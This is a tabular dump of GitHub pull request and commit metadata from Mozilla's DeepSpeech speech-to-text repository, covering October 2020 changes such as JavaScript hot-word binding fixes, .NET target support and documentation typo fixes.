373,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3377,3377,Minor spelling fixes to CONTRIBUTING.rst X-DeepSpeech: NOBUILD,,actual-kwarter,3734237,2020-10-14T03:54:52Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e9fc614d8a332e3c542668abb01aa2395c87a2ad,Minor spelling fixes to CONTRIBUTING.rst X-DeepSpeech: NOBUILD
374,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3376,3376,Pr 3375 rebased,,reuben,477142,2020-10-13T12:58:30Z,MEMBER,True,16,3,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9210a97d487b16191ab4e313886377b08eeb3f72,JS Binding Fix
375,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3376,3376,Pr 3375 rebased,,reuben,477142,2020-10-13T12:58:30Z,MEMBER,True,16,3,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aee7fc502c2b920ce5b42a00e853a935e3b476c6,Run Tests on CI for JS Client
376,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3376,3376,Pr 3375 rebased,,reuben,477142,2020-10-13T12:58:30Z,MEMBER,True,16,3,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3eaa44b358acdd668a68f13d6945d9b2fe1055ed,Fix JavaScript binding calls for Hot Words
377,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3375,3375,PR against r0.9 branch for JS Binding Fix and CI testing,"This PR enables hot-word boosting for Javascript Binaries and running test on it
For the issue #3336",imrahul361,36432937,2020-10-13T12:52:05Z,CONTRIBUTOR,False,16,3,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,29b39fd2d5dfa411ce9616dbff23bbbdedf9f49b,JS Binding Fix
378,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3375,3375,PR against r0.9 branch for JS Binding Fix and CI testing,"This PR enables hot-word boosting for Javascript Binaries and running test on it
For the issue #3336",imrahul361,36432937,2020-10-13T12:52:05Z,CONTRIBUTOR,False,16,3,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,368f76557a911eb46c2cd964891f92df37e2711e,Run Tests on CI for JS Client
379,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3375,3375,PR against r0.9 branch for JS Binding Fix and CI testing,"This PR enables hot-word boosting for Javascript Binaries and running test on it
For the issue #3336",imrahul361,36432937,2020-10-13T12:52:05Z,CONTRIBUTOR,False,16,3,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9df89bd945fc095d2367052c7951b368f1e95e1b,Fix JavaScript binding calls for Hot Words
380,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3374,3374,PR #3361 for R0.9,"This PR for JS Binding Fix and running test on it.
For the issue #3336",imrahul361,36432937,2020-10-13T12:34:16Z,CONTRIBUTOR,False,6,6,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ed09fd36101ada9b2f3440563041f9a63cdf6f29,Add r0.9 branch
381,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3374,3374,PR #3361 for R0.9,"This PR for JS Binding Fix and running test on it.
For the issue #3336",imrahul361,36432937,2020-10-13T12:34:16Z,CONTRIBUTOR,False,6,6,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,636b7133a19753f644a26ed3448daf5bb4a3a54c,"Merge pull request #3367 from reuben/create-r0.9

Add r0.9 branch"
382,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3374,3374,PR #3361 for R0.9,"This PR for JS Binding Fix and running test on it.
For the issue #3336",imrahul361,36432937,2020-10-13T12:34:16Z,CONTRIBUTOR,False,6,6,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,065c8a6cdfdc6523c82d90c5a2dbada029b557c3,Bump VERSION to 0.9.0-alpha.11
383,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3374,3374,PR #3361 for R0.9,"This PR for JS Binding Fix and running test on it.
For the issue #3336",imrahul361,36432937,2020-10-13T12:34:16Z,CONTRIBUTOR,False,6,6,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7056241f3780861ffe953d47e845f283af75252f,"Tiny fix to addHotWord doc string parameters

Already applied to master applying to r0.9 as requested"
384,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3374,3374,PR #3361 for R0.9,"This PR for JS Binding Fix and running test on it.
For the issue #3336",imrahul361,36432937,2020-10-13T12:34:16Z,CONTRIBUTOR,False,6,6,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,64fad81e10e57c52ab1c5986543773661ac426b0,"Merge pull request #3371 from nmstoker/patch-1

Tiny fix to addHotWord doc string parameters"
385,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2e16d388ce0445b9642718df579d19ec6a82abc3,Add support for netStandard2.1 and  netcoreapp3.1
386,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4371435f157e117c7e15d98525a00eb731b4a3fa,Update deprecated code
387,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,050854c3046dafc543d49d63b9f18b89c650e49b,"Removed AnyCPU from sln
moved test sound file to shared folder, using link now"
388,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0d176e9de58f6632d8f1091c489b9680d3766ec8,using existing audio file
389,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,824fc2645fca5c246630f39eaeea59e1764e1b49,Merge branch 'master' of https://github.com/mozilla/DeepSpeech
390,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4ff60e7f812d94cc6a78fb7c4eeda7ea89cd7975,update dotnet docs
391,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e924094509101858cca2a4a601d67bcee57fd95f,update readme
392,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9f3a7989528b9fd7bd00e470f147d433fc6e0075,add support for anyCPU in dotnet
393,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc242f1f932423969d87bfa5e79598bd60c08b7d,back to direct link in dotnet readme
394,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,18470c4a46e0ce60eb362962d2294391508435ff,update internal link for dotnet docs
395,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cadc98cee81c811c53086cb09ca96895785e876d,more readme upd
396,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a57bd0f8f649208004cca3abf74f7063c22dfdc0,more readme rst upd
397,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fb056db664ff8218efc15006434dea4f697e657f,revert to direct link readme
398,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b8c953c50bc433b74b327c3197bbca49e3cf9f11,WIP: update dotnet build funcs
399,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,293bd75fb0b83e82a54437b92117f2544c3f7b96,WIP: Add tests for Net core console app
400,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,34eefe8e5a726625fc32e29384e5f018a83103d8,final readme update
401,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f72326633bc60d88e528ee983845e7c3b1f5854a,dotnet csproj fix for CI
402,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a20682375e0a1a7ed3ece307902020035d1b3e29,dotnet CI scripts updated
403,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0523d034a6ccf38d7ee1300b8554618a0ed15c0b,"Revert dotnet platform to Any CPU,"
404,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b726cad4e8b692e82b424c70d2ba44cedd2f9f19,added netstandard2.0 support
405,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0212dd2c7a715e4add8ace73f73d21ff64d11f1,Merge branch 'master' of https://github.com/mozilla/DeepSpeech
406,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2dd757ac0ae801f4b7cfe41e775b4807ce6a8715,Merge branch 'master' of https://github.com/mozilla/DeepSpeech
407,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cd7aa33f71e9bf2714fe6e1ca8c3f26249a4b153,Merge branch 'master' of https://github.com/mozilla/DeepSpeech
408,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d0277ea626e430b469f74768577a9f0123edaf40,Trying to produce nuget package with all archs
409,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,feab9d245b4603301f578d8f9f4184a8eab23f76,fix for directory in tyml
410,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5242a14b77955a6c2d0ebb6446d5aba4bcbbc5d0,more dotnetpackage template fixes
411,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9565b22c5b7eaf6826f700935800d3c7d1ee8938,more dotnet tfile fix
412,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,84ffec6acc545c8481dabc4ddaf904d84344a637,another dotnet tyml try
413,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1acba3114f615a47c6487aa8359bdd9a96ca3f29,dotnet tyml fix
414,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3373,3373,Add support for netstandard and net core in dotnet client,"Added additional targets for dotnet client to support `netstandard2.0`, `netstandard2.1`, `netcoreapp3.1`.

Not sure if something else required, probably need to update nuget, let me know if something missing or I need to add something more. ",stepkillah,10140906,2020-10-13T07:38:04Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b6c411fb227a946ea25923371cc2b59813f1c713,dotnet tyml as in node
415,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3371,3371,Tiny fix to addHotWord doc string parameters,Already applied to master applying to r0.9 as requested,nmstoker,3694484,2020-10-12T11:52:31Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7056241f3780861ffe953d47e845f283af75252f,"Tiny fix to addHotWord doc string parameters

Already applied to master applying to r0.9 as requested"
416,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3370,3370,[docs/typos/enhance] - mozilla/deepspeech/readme.rst - update,"# [docs/typos/enhance] - mozilla/deepspeech/readme.rst - update

- <small>***fixing minor issues with readme.rst***</small>",tiagomoraismorgado,48789848,2020-10-12T11:48:05Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f753b86ca9000f4288f2814989c1759ac9eea7fe,"[docs/typos/enhance] - mozilla/deepspeech/readme.rst - update

[docs/typos/enhance] - mozilla/deepspeech/readme.rst - update"
417,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3369,3369,Tiny fix to addHotWord doc string parameters,"As the parameter for boost was actually written as ""word"" in the doc string, it was replacing the previous type for word with the type intended for boost and not showing any type for boost, thus messing up what displayed on https://deepspeech.readthedocs.io/en/master/Python-API.html",nmstoker,3694484,2020-10-11T16:46:53Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2ca91039c88a71b65f7c6b2c3d8b62d160d63b63,"Tiny fix to addHotWord doc string parameters

As the parameter for boost was actually written as ""word"" in the doc string, it was replacing the previous type for word with the type intended for boost and not showing any type for boost, thus messing up what displayed on https://deepspeech.readthedocs.io/en/master/Python-API.html"
418,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3367,3367,Add r0.9 branch,,reuben,477142,2020-10-07T17:00:52Z,MEMBER,True,3,3,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ed09fd36101ada9b2f3440563041f9a63cdf6f29,Add r0.9 branch
419,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3362,3362,Pr 3361,,lissyx,1645737,2020-10-06T10:41:49Z,COLLABORATOR,True,16,3,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,29b39fd2d5dfa411ce9616dbff23bbbdedf9f49b,JS Binding Fix
420,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3362,3362,Pr 3361,,lissyx,1645737,2020-10-06T10:41:49Z,COLLABORATOR,True,16,3,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,368f76557a911eb46c2cd964891f92df37e2711e,Run Tests on CI for JS Client
421,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3362,3362,Pr 3361,,lissyx,1645737,2020-10-06T10:41:49Z,COLLABORATOR,True,16,3,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9df89bd945fc095d2367052c7951b368f1e95e1b,Fix JavaScript binding calls for Hot Words
422,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3361,3361,enable hot-words boosting for Javascript,"This PR enables hot-word boosting for Javascript Binaries. 
For the issue #3336 ",imrahul361,36432937,2020-10-05T16:43:54Z,CONTRIBUTOR,True,16,3,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,29b39fd2d5dfa411ce9616dbff23bbbdedf9f49b,JS Binding Fix
423,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3361,3361,enable hot-words boosting for Javascript,"This PR enables hot-word boosting for Javascript Binaries. 
For the issue #3336 ",imrahul361,36432937,2020-10-05T16:43:54Z,CONTRIBUTOR,True,16,3,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,368f76557a911eb46c2cd964891f92df37e2711e,Run Tests on CI for JS Client
424,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3361,3361,enable hot-words boosting for Javascript,"This PR enables hot-word boosting for Javascript Binaries. 
For the issue #3336 ",imrahul361,36432937,2020-10-05T16:43:54Z,CONTRIBUTOR,True,16,3,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9df89bd945fc095d2367052c7951b368f1e95e1b,Fix JavaScript binding calls for Hot Words
425,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3360,3360,Fix binding of UTF8Alphabet class in decoder package,,reuben,477142,2020-10-05T10:42:58Z,MEMBER,True,3758,21,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2fd11dd74a551d4096d802c87eda3fa1ae0b28ad,Fix binding of UTF8Alphabet class in decoder package
426,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3360,3360,Fix binding of UTF8Alphabet class in decoder package,,reuben,477142,2020-10-05T10:42:58Z,MEMBER,True,3758,21,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fb4f5b6a84ac2fb810f961c474c183d17cb56a90,Add some coverage for training and inference in bytes output mode
427,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3360,3360,Fix binding of UTF8Alphabet class in decoder package,,reuben,477142,2020-10-05T10:42:58Z,MEMBER,True,3758,21,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,83a36b7a34063a919dbf9943e5bf1909d4567126,Rename --utf8 flag to --bytes_output_mode to avoid confusion
428,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3360,3360,Fix binding of UTF8Alphabet class in decoder package,,reuben,477142,2020-10-05T10:42:58Z,MEMBER,True,3758,21,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,09f0aa3d75ebe71b8fdb24e3f01e434e3629f515,Rename --force_utf8 flag to --force_bytes_output_mode to avoid confusion
